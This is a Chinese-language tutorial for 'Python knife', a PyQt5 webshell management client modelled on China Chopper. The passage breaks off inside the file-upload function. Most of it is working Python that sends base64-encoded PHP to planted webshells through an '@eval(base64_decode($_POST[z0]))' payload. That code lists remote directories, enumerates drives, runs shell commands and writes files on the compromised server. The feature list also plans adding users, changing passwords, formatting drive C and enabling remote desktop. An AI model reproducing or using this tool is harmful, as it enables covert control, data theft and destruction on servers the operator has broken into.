## 		Python knife

​    一款伪菜刀。

​    设计之初，本想只写个命令行的就可以了，但又想与众不同，想用python写代码，又不想用c#写前端（c#太卡了），万分无奈之下，找到一个替代品，Pyqt，所以我这个简易的菜刀就由此开始了。本程序实在python3下开发的。GUI界面用的Pyqt模块
既然想用pyqt做界面，第一步就是先装好pyqt，

#### Python knife介绍视频

<https://pan.baidu.com/s/1skQdp5fIIS4BlqrWp2CbFw>

## 0x01 PYQT的安装

#### 1.安装好Python3的环境

 添加环境变量，保证安装正确，

#### 2.安装PyQt5

采用命令安装，Win+R，输入CMD，打开命令框，输入以下命令。后面是豆瓣的镜像地址，是为了加快下载速度。

```python
pip install PyQt5 -i https://pypi.douban.com/simple
```

#### 3.安装Qt的工具包

```python
pip install PyQt5-tools -i https://pypi.douban.com/simple
```

#### 4.测试PyQt5环境是否安装成功

复制以下代码到后缀为.py的文件中

```python
import sys
from PyQt5 import QtWidgets,QtCore
app = QtWidgets.QApplication(sys.argv)
widget = QtWidgets.QWidget()
widget.resize(360,360)
widget.setWindowTitle("hello,pyqt5")
widget.show()
sys.exit(app.exec_())
```

能够运行即安装成功



## 0x02 GUI界面设计

下面是最初的设计功能：

#### Shell管理

```
连接

添加

编辑

复制

删除

清空

检查
```

#### 文件管理

```
更新

上传

下载

删除

重命名
```

#### 虚拟终端

```
基本完成，有光标问题

历史命令

历史命令--右键菜单---复制
	            --导出
	            --粘贴
	            --清空

虚拟终端--右键菜单--复制
	            --粘贴
	            --清空
```

#### 自写脚本

```
可以执行各种脚本，目前仅支持 PHP、Bat、Bash、Python脚本
```

#### 数据库管理

```

```

#### 快捷功能

```
查询用户

添加用户

修改密码

强制关机

格式化C盘

开启3389

中文检测

联系作者

退出程序

待添加
```

下面是我用到的一些PYQT的控件

```
Label标签控件
Pushbutton按钮控件
textEdit文本框控件
Listweight列表控件
treeWidget树形控件
tableWidget 控件
tabWidget 控件
Radiobutton 控件
lineedit 控件
label 控件
```



## 0x03 后端代码介绍

### 一．Shell管理

Shell管理界面含有连接、添加、编辑、复制、删除、清空等功能，同时在这个位置含有一个右键菜单，这些功能都显示在右键菜单中，用户可以方便的点击各种功能。

#### 1.右键菜单

当点击右键时，执行以下代码来创建右键菜单

```python
self.Ui.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
self.Ui.tableWidget.customContextMenuRequested['QPoint'].connect(self.createContextMenu)
```

Shell管理右键菜单代码如下：

```python
def createContextMenu(self):
    '''''
    创建右键菜单
    '''
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested
    self.Ui.tableWidget.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)   			self.Ui.tableWidget.customContextMenuRequested.connect(self.showContextMenu)
	
    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.connect_shell_button = self.contextMenu.addAction(u'连接')
    self.add_shell_button = self.contextMenu.addAction(u'添加')
    self.modify_shell_button = self.contextMenu.addAction(u'编辑')
    self.second = self.contextMenu.addMenu(u'复制')
    self.ip_copy_button = self.second.addAction(u'IP')
    self.url_copy_button = self.second.addAction(u'URL')
    self.passwd_copy_button = self.second.addAction(u'密码')
    self.type_copy_button = self.second.addAction(u'类型')
    self.time_copy_button = self.second.addAction(u'时间')
    self.all_copy_button = self.second.addAction(u'全部')
    self.delete_shell_button = self.contextMenu.addAction(u'删除')
    self.delete_all_shell_button = self.contextMenu.addAction(u'清空')
    self.check_shell_button = self.contextMenu.addAction(u'检查')

    # 将动作与处理函数相关联                 
    self.connect_shell_button.triggered.connect(self.Connect_shell)
    self.add_shell_button.triggered.connect(self.Add_shell_show)
    self.modify_shell_button.triggered.connect(self.Modify_shell)
    self.delete_shell_button.triggered.connect(self.Delete_shell)
    self.delete_all_shell_button.triggered.connect(self.Delete_all_shell)
    self.check_shell_button.triggered.connect(self.Check_shell_button)

    #二级菜单        
    self.ip_copy_button.triggered.connect(lambda:self.shell_copy('ip'))    
    self.url_copy_button.triggered.connect(lambda:self.shell_copy('url'))       	
    self.passwd_copy_button.triggered.connect(lambda:self.shell_copy('passwd'))     
    self.type_copy_button.triggered.connect(lambda:self.shell_copy('type'))     
    self.time_copy_button.triggered.connect(lambda:self.shell_copy('time'))      
    self.all_copy_button.triggered.connect(lambda:self.shell_copy('all'))
```

在这个函数里，首先创建右键菜单的文字，然后将他们绑定不同的函数，来执行相应的操作

将右键菜单移动到鼠标的位置

```python
def showContextMenu(self, pos):  #右键点击时调用的函数
    # 菜单显示前，将它移动到鼠标点击的位置
    self.contextMenu.move(QtGui.QCursor.pos())
    self.contextMenu.show()
```

#### 2.连接shell

当点击右键菜单上的连接时，便调用这个函数，代码如下：

```python
def Connect_shell(self):
    try:
        shell = self.getshell()
        #print(shell[2])
        if shell[2]=="PHP":
            phpcode = "echo(hello);"
            phpcode = base64.b64encode(phpcode.encode('GB2312'))
            data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}
            self.Ui.PHP.setChecked(True)  #设置php为选中状态
            # if shell[2]=="ASP":
            #     phpcode="response.write('hello')"
            #     phpcode=base64.b64encode(phpcode.encode('GB2312'))
            #     print(phpcode)
            #     data = {shell[1]: '@eval(<script language="javascript">var a=window.atob("request z0");document.write(a)</script>);',
            #             'z0': phpcode}
            #print(data)
            #print(phpcode)

            #print(data)
            #print(shell[1])
            returndata =self.sendPOST(shell,data).decode('utf-8')
            if returndata == "hello":
                #print(returndata)
                box = QtWidgets.QMessageBox()
                #self.statusBar().showMessage(shell )  # 状态栏显示信息
                box.information(self, "提示", "连接成功！")
                self.Ui.shelllabel.setText(shell[0]+'     '+shell[1]+'     '+shell[2])
                try:
                    self.File_update()  #显示目录
                except:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "文件管理初始化失败！")
                try:
                    self.Virtualshell()
                except:
                    box = QtWidgets.QMessageBox()
                    box.information(self, "提示", "虚拟终端初始化失败！")

             else:
                box = QtWidgets.QMessageBox()
                box.information(self, "提示", "连接失败！")
          except:
             box = QtWidgets.QMessageBox()
             box.information(self, "提示", "连接失败！")
```

在这块代码片中，首先调用了一个函数getshell来获取shell信息然后判断语言类型来点用不同的代码，这里是加密了一个hello并调用sendPost函数发送给服务端。服务端输出，即连接成功，同时，尝试调用显示目录、虚拟终端函数。

Getshell 函数如下：

```python
def getshell(self):
	shell = []
	row = self.Ui.tableWidget.currentRow()  # 获取当前选中行的行号

	for i in range(0, self.Ui.tableWidget.columnCount()):
		shell.append(self.Ui.tableWidget.item(row, i).text())  # 获取选中行的文本
	return shell
```

POST请求函数如下：

```python
def sendPOST(self,shell,phpcode): #发送php请求
    #请求头
    headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.84 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded" #以表单的形式请求
    }
    #print(phpcode)
    #print(shell[0])
    #print(phpcode)

    postData = urllib.parse.urlencode(phpcode).encode("utf-8","ignore")
    req = urllib.request.Request(shell[0], postData, headers)
    # 发起请求
    response = urllib.request.urlopen(req)
    data = (response.read())
    #print(data)
    return (data)
```

#### 3.添加shell

添加shell这里要调用添加shell这个子窗口，当我点击右键的添加时，打开添加shell子窗口，当点击子窗口的确定时，将子窗口两个输入框中的内容组合起来添加到主窗口的shell管理列表中

涉及到两个窗口之间的窗体问题，这就让我非常懵逼了。。
还有listweight的添加等操作

当点击右键菜单上的添加时，便调用这个函数，显示子窗口，代码如下：

```python
# 调用子窗口显示
def Add_shell_show(self):
    self.WChild = Ui_Form()
    self.dialog = QtWidgets.QDialog(self)
    self.WChild.setupUi(self.dialog)
    self.dialog.show()
    sender = self.sender()

    if sender.text() == "添加":
        self.WChild.pushButton.clicked.connect(self.GetLine)  # 子窗体确定添加shell
    elif sender.text() == "编辑":
        self.WChild.pushButton.clicked.connect(self.editLine)  # 子窗体确定编辑shell
```

这个函数是编辑和添加同时可以调用，当添加调用的时候，点击确定便调用添加shell，当编辑调用的时候，点击确定便调用编辑shell。当添加窗口点击确定便调用GetLine函数。函数如下：

```python
#添加shell
def GetLine(self):  # 添加shell给listweiget传值
    url = self.WChild.lineEdit.text()  #获取添加shell窗口的url
    passwd = self.WChild.lineEdit_2.text()  #获取添加shell窗口的密码
    type = self.WChild.comboBox.currentText()   #获取添加shell窗口的类型
    ip = self.getIP(url)
    time = self.Ui.timelabel.text()  #获取当前时间
    if(url == "" or passwd ==""):   #判断地址或者密码是不是空
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "地址或密码不能为空！")
    else:
        shell = []
        shell.append(url)
        # print(shell)
        phpcode = "echo(hello);"
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        data = {passwd: '@eval(base64_decode($_POST[z0]));',
                    'z0': phpcode}
        
         try:
            returndata =self.sendPOST(shell,data).decode('utf-8')
            # print(returndata)
         except:
            returndata = ''
        # print(returndata)
        if returndata=='hello':
            zhuangtai ='1'
        else:
            zhuangtai ='-1'
        row = self.Ui.tableWidget.rowCount()  #获取行数
        self.Ui.tableWidget.setRowCount(row+1)
        urlItem = QTableWidgetItem(url)
        passwsItem = QTableWidgetItem(passwd)
        typeItem =  QTableWidgetItem(type)
        ipItem = QTableWidgetItem(ip)
        zhuangtaiItem = QTableWidgetItem(zhuangtai)
        timeItem = QTableWidgetItem(time)
        self.Ui.tableWidget.setItem(row, 0, urlItem)
        self.Ui.tableWidget.setItem(row, 1, passwsItem)
        self.Ui.tableWidget.setItem(row,2,typeItem)
        self.Ui.tableWidget.setItem(row, 3, ipItem)
        self.Ui.tableWidget.setItem(row, 4, zhuangtaiItem)
        self.Ui.tableWidget.setItem(row, 5, timeItem)
        self.dialog.close()
```

首先，获取子窗口的值，包含url、passwd、type。而ip是调用了getIp函数来获取真是IP，并获取当前时间显示在主界面上。最后关闭子窗口。

getIP函数：

```python
#域名解析IP
def getIP(self,url):
    try:
        yuming = url.split('//')
        yuming = yuming[1].split('/')
        first =  yuming[0].split('.')
        #print(first[0])
        if first[0] == '10' or first[0] == '192' or first[0] == '172' or first[0] == '127' or first[0] == '0' or first[0] == '255':
            return yuming[0]
        if re.findall(r'\d+\.\d+\.\d+\.\d+', url):
            return yuming[0]
        else:
            ip = socket.gethostbyname(yuming[0])  # 获取远程主机的IP地址
            return ip
    except:
        ip = '暂无'
        return ip
```

#### 4.编辑shell

​        这里就是点击编辑shell调用添加shell窗口，同样的把列表中选中的值赋值给子窗口的输入框，然后用户修改，再把值赋值给主窗口原来的位置。

当点击右键菜单上的编辑时，便调用这个函数，代码如下：

```python
shell = self.Ui.listWidget.currentItem().text()  #获取选中行的文本
    self.Add_shell_show()    #显示子窗口
    shell = shell.split("          ")   #分割数据
    self.WChild.lineEdit.setText(shell[0])   #给子窗口赋值
    self.WChild.lineEdit_2.setText(shell[1])
    self.WChild.pushButton.setText("编辑")
    #删除选中的行
except:
    box = QtWidgets.QMessageBox()
    box.warning(self, "提示", "请选择一项！")
```

这里首先将值赋值给子窗口，用户进行修改。这里因为是两个按钮调用同一个子窗口，所以我在窗口实现实时用了sender来判断是谁发出的信号，都调用Add_shell_show窗口显示函数，然后因为是编辑，所以调用editLine函数，如下：

```python
#赋值确定按钮
def editLine(self):
    url = self.WChild.lineEdit.text()  #获取子窗口的值
    passwd = self.WChild.lineEdit_2.text()
    type = self.WChild.comboBox.currentText()  # 获取添加shell窗口的类型
    ip = self.getIP(url)
    #print(ip)
    time = self.Ui.timelabel.text()  # 获取当前时间
    row = self.Ui.tableWidget.currentRow()  # 获取当前选中行的行号
    #检测状态
    shell = []
    shell.append(url)
    # print(shell)
    phpcode = "echo(hello);"
    phpcode = base64.b64encode(phpcode.encode('GB2312'))
    data = {passwd: '@eval(base64_decode($_POST[z0]));',
            'z0': phpcode}
 	try:
        returndata =self.sendPOST(shell,data).decode('utf-8')
        # print(returndata)
    except:
        returndata = ''
    # print(returndata)
    if returndata == 'hello':
        zhuangtai = '1'
    else:
        zhuangtai = '-1'
    #添加数据
    urlItem = QTableWidgetItem(url)
    passwsItem = QTableWidgetItem(passwd)
    typeItem = QTableWidgetItem(type)
    ipItem = QTableWidgetItem(ip)
    zhuangtaiItem = QTableWidgetItem(zhuangtai)
    timeItem = QTableWidgetItem(time)
    self.Ui.tableWidget.setItem(row, 0, urlItem)
    self.Ui.tableWidget.setItem(row, 1, passwsItem)
    self.Ui.tableWidget.setItem(row, 2, typeItem)
    self.Ui.tableWidget.setItem(row, 3, ipItem)
    self.Ui.tableWidget.setItem(row, 4, zhuangtaiItem)
    self.Ui.tableWidget.setItem(row, 5, timeItem)
    self.dialog.close()   #关闭子窗口
```

在这个函数中，首先获取子窗口的值，包含url、passwd、type。而ip是调用了getIp函数来获取真是IP，并获取当前时间显示在主界面上。最后关闭子窗口。



#### 5.复制

在shell管理右键菜单中已经创建了二级子菜单。分别对应不同的功能。

当点击右键菜单上的复制-IP时，便调用这个函数，代码如下：

```python
def shell_copy(self,type):
    data = self.getshell()
    if type =='ip':
        zhi = data[3]
    if type =='url':
        zhi = data[0]
    if type =='passwd':
        zhi = data[1]
    if type =='type':
        zhi = data[2]
    if type =='time':
        zhi = data[4]
    if type =='all':
        zhi = ''
        for i in data:
            zhi=zhi+'  '+i
    #print(zhi)
    wincld.OpenClipboard()
    wincld.EmptyClipboard()
    wincld.SetClipboardData(win32con.CF_UNICODETEXT, zhi)
    wincld.CloseClipboard()
```

当调用这个函数的时候传值给它需要复制的类型。最后将数据存储到剪切板中，用户可以随意粘贴。

#### 6.删除shell

当点击右键菜单上的删除时，便调用这个函数，显示子窗口，代码如下：

```python
#删除选中的shell
def Delete_shell(self):
    button = QMessageBox.question(self, "警告！",
                                  self.tr("你确定要删除选中的项吗？"),
                                  QMessageBox.Ok | QMessageBox.Cancel,
                                  QMessageBox.Ok)
    if button == QMessageBox.Ok:
        self.Ui.tableWidget.removeRow(self.Ui.tableWidget.currentRow())#删除选中的行
    else:
        return
```

这个就比较简单了，直接删除listweight选中的行就可以了。删除之前有个警告框，以免用户误操作。

#### 7.清空shell



上面的删除只是删除一条数据，而清空则时删除所有内容。当点击右键菜单上的删除时，便调用这个函数，代码如下：

```python
#清空所有
def Delete_all_shell(self):
    button = QMessageBox.question(self, "警告！",
                                  self.tr("你确定要清空所有内容吗？"),
                                  QMessageBox.Ok | QMessageBox.Cancel,
                                  QMessageBox.Ok)
    if button == QMessageBox.Ok:
        for i in range(0, self.Ui.tableWidget.rowCount()):  # 循环行
            self.Ui.tableWidget.removeRow(0)
        #self.Ui.tableWidget.clearContents()  #清空所有内容，不包含标题头
        #self.Ui.tableWidget.clear()   #清空所有内容，包括标题
    else:
        return
  
```


这里是遍历整个tableweight的数据，进行逐条删除。同样含有提示框，以防用户误删除。

#### 8.检查shell

shell检查可以一次性检查所有shell的连接性，然后直接修改状态显示给用户

```python
#shell检查
def Check_shell_button(self):
    shell=[]
    for i in range(0, self.Ui.tableWidget.rowCount()):  # 循环行
        for j in range(0, self.Ui.tableWidget.columnCount()):  # 循环列
            if self.Ui.tableWidget.item(i, j) != None:  # 有数据
                shell.append(self.Ui.tableWidget.item(i, j).text()) # 空格分隔
        # print(data)
        # print(shell)
        phpcode = "echo(hello);"
        phpcode = base64.b64encode(phpcode.encode('GB2312'))
        data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
                'z0': phpcode}
        # print(data)
        try:
            returndata = self.sendPOST(shell, data).decode('utf-8')
            # print(returndata)
        except:
            returndata = ''
        # print(returndata)
        if returndata == 'hello':
            zhuangtai = '1'
        else:
            zhuangtai = '-1'
        self.Ui.tableWidget.item(i, 4).setText(zhuangtai)  #设置状态
        shell = []
    box = QtWidgets.QMessageBox()
    box.information(self, "shell检查", "检查完毕！")
```

#### 9.保存shell

至此呢，shell管理大致完成了，当然，还有最重要的一点，当用户退出软件再次打开软件时，怎么才能保持shell还在呢。这里呢，我就保存到一个txt文件中了，刚开始的时候我是每次添加，编辑，删除，都会重新写入文件。后来我又找到一种简单的方法，那就是重载关闭事件。在软件关闭时，将tableweight中的数据保存到csv文件中
代码如下：

```python
# 重载关闭事件  将tableweight写入txt文件
def closeEvent(self, event):
    data=[]
    comdata = []
    for i in range(0,self.Ui.tableWidget.rowCount()):   #循环行
        for j in range(0, self.Ui.tableWidget.columnCount()):   #循环列
            if self.Ui.tableWidget.item(i,j)!=None:     #有数据
                data.append(self.Ui.tableWidget.item(i,j).text()) #空格分隔
        comdata.append(list(data))
        data=[]
    # print(comdata)
    with open('shell.csv', 'w', newline='') as f:
        writer = csv.writer(f)
        for row in comdata:
            writer.writerow(row)
    f.close()
```

当每次打开文件时，加载csv文件，代码如下

```python
def readshellfile(self):  #读取shell文件
    try:
        with open('shell.csv') as f:
            reader = csv.reader(f)
            for each in reader:
                row = self.Ui.tableWidget.rowCount()  # 获取行数
                self.Ui.tableWidget.setRowCount(row + 1)
                urlItem = QTableWidgetItem(each[0])
                passwsItem = QTableWidgetItem(each[1])
                typeItem = QTableWidgetItem(each[2])
                ipItem = QTableWidgetItem(each[3])
                timeItem = QTableWidgetItem(each[4])
                self.Ui.tableWidget.setItem(row, 0, urlItem)
                self.Ui.tableWidget.setItem(row, 1, passwsItem)
                self.Ui.tableWidget.setItem(row, 2, typeItem)
                self.Ui.tableWidget.setItem(row, 3, ipItem)
                self.Ui.tableWidget.setItem(row, 4, timeItem)
        f.close()  # 关闭文件
    except:
    	pass
```

这里呢。我加了个try防止出错误，因为如果文件不存在，就会报错。

### 二、文件管理

文件管理界面含有更新、上传、双击、下载、删除、重命名等功能，同时在这个位置含有一个右键菜单，这些功能都显示在右键菜单中，用户可以方便的点击各种功能。

#### 1.右键菜单

当点击右键时，执行以下代码来创建右键菜单

```python
#文件操作右键菜单
self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)   self.Ui.treeWidget_2.customContextMenuRequested['QPoint'].connect(self.fileContextMenu)
```

文件管理右键菜单代码如下：

```python
def fileContextMenu(self):
    '''''
    创建右键菜单
    '''
    # 必须将ContextMenuPolicy设置为Qt.CustomContextMenu
    # 否则无法使用customContextMenuRequested信号
    self.Ui.treeWidget_2.setContextMenuPolicy(QtCore.Qt.CustomContextMenu)
    self.Ui.treeWidget_2.customContextMenuRequested.connect(self.showContextMenu)

    # 创建QMenu
    self.contextMenu = QtWidgets.QMenu(self)
    self.file_update = self.contextMenu.addAction(u'更新')
    self.file_upload = self.contextMenu.addAction(u'上传')
    self.file_download = self.contextMenu.addAction(u'下载')
    self.file_delete = self.contextMenu.addAction(u'删除')
    self.file_rename =self.contextMenu.addAction(u'重命名')

    #将动作与处理函数相关联
    #这里为了简单，将所有action与同一个处理函数相关联，
    #当然也可以将他们分别与不同函数关联，实现不同的功能
    self.file_update.triggered.connect(self.File_update)
    self.file_upload.triggered.connect(self.File_upload)
    self.file_download.triggered.connect(self.File_download)
    self.file_delete.triggered.connect(self.File_delete)
    self.file_rename.triggered.connect(self.renameshow)
```

下面这个函数是吧右键菜单移动到鼠标的位置

```python
def showContextMenu(self, pos):  #右键点击时调用的函数
    # 菜单显示前，将它移动到鼠标点击的位置
    self.contextMenu.move(QtGui.QCursor.pos())
    self.contextMenu.show()
```

#### 2.更新

更新便是发送一个POST请求，列出目录到treeweight上，代码如下

```python
def File_update(self):
    shell = self.Ui.shelllabel.text()
    if shell!="":
        #列出目录
        self.Ui.treeWidget.clear() #清空treeweight的所有内容
        self.Ui.treeWidget_2.clear() #清空treeweight_2的所有内容
        system =self.systemtype() #获取系统类型
        if system == "WINNT":
            path=self.getpan()#列出所有盘符
            # path=["C:","D:","E:","F:","G:","H:","I:","J:"]
            path=path[1:]
        if system == "Linux":
            path = self.getCatalog()  #获取远程主机的所有根目录
            #print(path)
        for i in path:  #循环列出c盘  D盘等
            data=self.listfile(i)   #调用列出目录
            data = data.decode('utf-8',"ignore")
            #print(data)
            listdata = data.split('  ')   # 分割data
            root = QTreeWidgetItem(self.Ui.treeWidget)  #创建对象
            #self.tree = QTreeWidget()
            root.setText(0,i)  #创建主节点
            listdata=listdata[:-1]   #去掉空格
            for i in listdata:  #循环每一个元素

                singerdata = i.split("\t")   #用\t将名字大小权限修改时间分割
                #print(singerdata[0])
                if singerdata[0] !='./' and singerdata[0] != '../' and singerdata[0][-1] == "/": #判断是不是有下级目录
                    singerdata[0]=singerdata[0][:-1]   #创建c盘下的子节点
                    child1 = QTreeWidgetItem(root)   #子节点位置
                    child1.setText(0, singerdata[0])   #子节点赋值
             
    else:
        box = QtWidgets.QMessageBox()
        box.information(self, "提示", "请先连接shell！")
```

​        在这块代码片中，首先获取shell信息，然后清空掉两个list weight中的内容，并利用systemtype()函数来获取育成服务器类型，利用getpan()函数或者getCatalog()函数来返回服务器的根目录，然后调用listfile()函数循环发送请求来列出每个盘的文件，并将返回的数据分隔显示在listweight控件上。

Systemtype函数：

```python
#判断当前系统类型
def systemtype(self):
    phpcode= "echo PHP_OS;"
    result=self.sendcode(phpcode).decode('utf-8')
    return result
```

getpan函数

```python
# 获取远程主机的所有盘符
def getpan(self):
    pancode = "exec('wmic LOGICALDISK get name',$dir);print_r($dir);"
    pan = self.sendcode(pancode).decode('gbk', "ignore")
    pan = pan.split('\n    ')
    pan = pan[1:-1]
    panlist = []
    for i in pan:
        panlist.append(i[-2:])
    return panlist
```

getCatalog函数

```python
#获取linux根目录
def getCatalog(self):
    result3 = []
    code = "system('cd /&&ls');"
    result = self.sendcode(code).decode('gbk', "ignore")
    result2 =result.split('\n')[:-1]
    for  i  in result2:
        result3.append('/'+i)
    return result3
```

listfile函数

```python
def listfile(self,path):
    shell = self.Ui.shelllabel.text()  #获取shell
    #print(shell)
    shell = shell.split("     ")
    phpcode = '$D="' + path + '";$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M = NULL;$L = NULL;while($N= @readdir($F)){$P =$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert( @fileperms($P), 10, 8), -4);$R = "\t".$T."\t". @filesize($P)."\t".$E."  ";if(@ is_dir($P)){$M.=$N."/".$R;}else{$L.=$N.$R;}}echo($M.$L);@closedir($F);};die();'
    #print(phpcode)
    phpcode = base64.b64encode(phpcode.encode('GB2312'))
    #print(phpcode)
    data = {shell[1]: '@eval(base64_decode($_POST[z0]));',
            'z0': phpcode}
    #print(data)
    return self.sendPOST(shell,data)  #返回数据
```



#### 3.双击

##### （1）双击显示目录

这里就是利用双击获取选中的文件名，然后获取父节点的名组合成路径，发送一个请求。将返回的数据分隔开写入到treeweight_2中。

```python
# treeweight鼠标双击显示详细信息
def displayfile(self):
    try:
        #print(filepath)  #输出当前项的绝对目录
        data=self.listfile(self.showfilepath("treeWidget"))   #调用函数显示数据
        data = data.decode('utf-8', "ignore")
        #print(data)
        listdata = data.split('  ')   #将文件分开
        #print(listdata)
        listdata = listdata[:-1]  #去掉最后的空
        #print(listdata)
        self.Ui.treeWidget_2.clear()  #清空treeweight_2中的所有数据
        currentItem = self.Ui.treeWidget.currentItem()  # 当前的Item对象
        # if currentItem.parent()!=None:
        if (currentItem.child(0) != None):
            num = currentItem.childCount()  # 获取子节点个数
            for i in range(0,num+3):
                currentItem.takeChild(0)  #删除当前所有子节点
        # else:
        #     self.Ui.treeWidget.takeTopLevelItem(self.Ui.treeWidget.currentItem.row())
        index = self.Ui.treeWidget.currentItem()  # 当前的Item对象
        for i in listdata:  # 循环每一个元素
            singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
            # print(singerdata[0])
            if singerdata[0] !="./" and singerdata[0] != "../" and singerdata[0] != "..\\" and singerdata[0] != ".\\":
                child2 = QTreeWidgetItem(index)  # 创建子子节点
                child2.setText(0, singerdata[0])
                #将文件详细信息写入到listweight_2
            if singerdata[0] != "./" and singerdata[0] != "../" :#and singerdata[0][-1]!="/":  #文件显示出来,显示文件夹！！！
                if singerdata[0][-1]=="/":  #去掉文件夹后面的斜杠
                    singerdata[0]=singerdata[0][:-1]
                try:
                    singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                except:
                    pass
               # print(singerdata)
                root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                #显示数据
                root.setText(0, singerdata[0])
                root.setText(1, singerdata[1])
                root.setText(2, singerdata[3])
                root.setText(3, singerdata[2])
    except:
        pass
```

首先，调用showfilepath()函数来获取当前选中的完整路径，然后通过listfile()函数来列出目录，把他分开显示在listweight_2上面，同时删除并创建同样的节点在listweight上。

showfilepath函数：

```python
#显示当前对象的路径
def showfilepath(self,index):
    #filename = self.Ui.treeWidget.currentItem().text(0)  #当前目录或文件名
    if index =="treeWidget":
        index = self.Ui.treeWidget.currentItem()   #当前的Item对象
    if index =="treeWidget_2":
        index = self.Ui.treeWidget_2.currentItem()
    try:
        filepath = index.text(0)
        index2=index.parent().text(0)   #父节点
        filepath = index2+'/'+index.text(0)  #组合
        index3=index.parent().parent().text(0)   #父父节点
        filepath = index3 + '/' + filepath  #组合目录
        index4=index.parent().parent().parent().text(0)   #父父父节点
        filepath = index4 +'/' + filepath  #组合目录
        index5=index.parent().parent().parent().parent().text(0)   #父父父父节点
        filepath = index5 +'/' + filepath  #组合目录
        index6 = index.parent().parent().parent().parent().parent().text(0)  # 父父父父节点
        filepath = index6 + '/' + filepath  # 组合目录
    except:
        pass
    #print(filepath)
    return filepath
```

在显示文件大小的时候有一个换算函数，将字节换算成KB、M或者、G

换算文件大小函数

```python
def Transformation(self,size):
    if (size < 1024):
        return str(size) + " B"
    elif 1024 < size < 1048576:
        size = round(size / 1024, 2)
        return str(size) + " KB"
    elif 1048576 < size < 1073741824:
        size = round(size / 1048576, 2)
        return str(size) + " MB"
    elif size > 107374824:
        size = round(size / 1073741824, 2)
        return str(size) + " GB"
    else:
        pass
```

##### （2）双击进入目录

这里同样是利用双击获取选中的文件名，然后获取父节点的名组合成路径，发送一个请求。将返回的数据分隔开写入到treeweight_2中。不同的是，双击进入是获取当前选中，显示在当前控件，而双击显示是显示在不同的控件上。

双击代码如下：

```python
#双击进入目录
def intodisplay(self):
    try:
        treeWidget_path = self.showfilepath("treeWidget")
        treeWidget_path_2 = self.showfilepath("treeWidget_2")
        index = self.Ui.treeWidget.currentItem()  # 当前的Item对象
        index2text = self.Ui.treeWidget_2.currentItem().text(0)  # 当前的Item对象
        item = QtWidgets.QTreeWidgetItemIterator(self.Ui.treeWidget_2)
        # 该类的value()即为QTreeWidgetItem
        num = 0
        while item.value():
            try:
                text = item.value().text(0)  #读取值

                # print(text)
                if text == index2text:
                    break;
            # if  item.value().checkState(0) != QtCore.Qt.Checked:
            # # 参考网上的方法，判断有无父母结点后再分别操作的那个，实在找不到更直接的
            #     self.deleteNode()
            # # 因为我这里是删除了结点，删除后结点位置发生变化，所以要向后退一步
            #     item = item.__isub__(1)
            # # 到下一个节点
                item = item.__iadd__(1)
                num = num + 1
            except:
                pass
        # print(num)
        try:
            # print(index.text(0))
            item = index.child(num)   #设置子节点为当前对象
            self.Ui.treeWidget.setCurrentItem(item)   #设置选中
        except:
            pass
        # print(index2text)
        if '.' not in index2text :
            #设置选中行
            path = treeWidget_path+'/'+treeWidget_path_2
            # print(path)
            data = self.listfile(path)  # 调用函数显示数据
            data = data.decode('utf-8', "ignore")
            # print(data)
            listdata = data.split('  ')  # 将文件分开
            # print(listdata)
            listdata = listdata[:-1]  # 去掉最后的空
            # print(listdata)
            self.Ui.treeWidget_2.clear()  # 清空treeweight_2中的所有数据
            index = self.Ui.treeWidget.currentItem()
            for i in listdata:  # 循环每一个元素

                singerdata = i.split("\t")  # 用\t将名字大小权限修改时间分割
                if singerdata[0] != "./" and singerdata[0] != "../" and singerdata[0] != "..\\" and singerdata[
                    0] != ".\\":
                    child2 = QTreeWidgetItem(index)  # 创建子子节点
                    child2.setText(0, singerdata[0][:-1])
                if singerdata[0] != "./" and singerdata[
                    0] != "../":  # and singerdata[0][-1]!="/":  #文件显示出来,显示文件夹！！！
                    if singerdata[0][-1] == "/":  # 去掉文件夹后面的斜杠
                        singerdata[0] = singerdata[0][:-1]
                    try:
                        singerdata[2] = self.Transformation(abs(int(singerdata[2])))  # 尝试单位转换
                    except:
                        pass
                    # print(singerdata)
                    root = QTreeWidgetItem(self.Ui.treeWidget_2)  # 创建对象
                    # 显示数据
                    root.setText(0, singerdata[0])
                    root.setText(1, singerdata[1])
                    root.setText(2, singerdata[3])
                    root.setText(3, singerdata[2])
    except:
        pass
```

这里，先获取treeWidget上的当前对象和treeWidget_2上的当前对象的文本，然后组合路径获取数据，将返回的数据显示在treeWidget_2上，同时设置treeWidget上一样的节点选中，并创建子节点。

#### 4.上传文件

上传文件，首先，当点击上传时，调用以下函数：

```python
##文件上传
def File_upload(self):
    # 尝试获取文件路径
    shell = self.Ui.shelllabel.text()  # 获取shell
    if shell != "":
        try:
            fileName =  self.fileopen()   #调用文件打开对话框
            #print(type(fileName))
            #print(fileName)
            # 尝试打开文件读取数据
            f = open(fileName,"rb")
            fsize = os.path.getsize(fileName) #获取文件大小
            filedata = f.read()
            f.close()
            shell = shell.split("     ")
            #print(fsize)
            #print(filedata)
            #z2 = base64.b64encode(filedata)
            newfileName=fileName.split("/")
            #print(newfileName[-1])
            path=self.showfilepath("treeWidget")+"/"+newfileName[-1]
            #print(path)
            #shell = self.Ui.shelllabel.text()  # 获取shell
            z = r"@eval(base64_decode($_POST[z0]));"  # 文件执行代码
            z0 = base64.b64encode((str('$c=base64_decode($_POST["z2"]); echo(@fwrite(fopen("'+path+'","w"),$c));die();')).encode('utf-8'))

            #z1 = base64.b64encode((str(path)).encode('utf-8')) # 文件路径加密
